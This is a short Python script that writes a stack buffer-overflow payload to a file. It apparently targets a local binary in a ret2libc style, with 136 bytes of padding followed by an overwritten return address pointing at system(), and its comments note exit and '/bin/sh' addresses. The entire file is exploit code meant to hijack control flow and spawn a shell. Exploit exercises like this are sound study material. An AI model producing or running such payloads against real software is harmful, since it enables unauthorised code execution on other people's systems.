#!/usr/bin/env python3

# 7ffff7e1f860
system_call = b'\x7f\xff\xf7\xe1\xf8\x60'[::-1]

# p exit? 0x7ffff7e15100
# search-pattern '/bin/sh' x7ffff7f54000


payload = b'a'*(136)+system_call
f = open('payload', 'wb')
f.write(payload)
